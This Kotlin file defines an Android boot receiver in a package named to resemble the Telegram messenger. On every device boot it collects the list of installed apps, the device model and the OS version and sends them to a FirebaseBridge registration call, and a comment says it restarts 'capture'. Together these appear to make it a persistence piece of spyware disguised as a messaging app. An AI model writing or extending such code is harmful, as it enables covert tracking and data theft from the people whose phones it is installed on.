package com.telegram2.messaging.remote

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED) {
            val pm = context.packageManager
            val apps = pm.getInstalledApplications(0).map { it.packageName }
            FirebaseBridge.registerDevice(Build.MODEL, Build.VERSION.RELEASE, apps)
            // Restart capture if it was running
        }
    }
}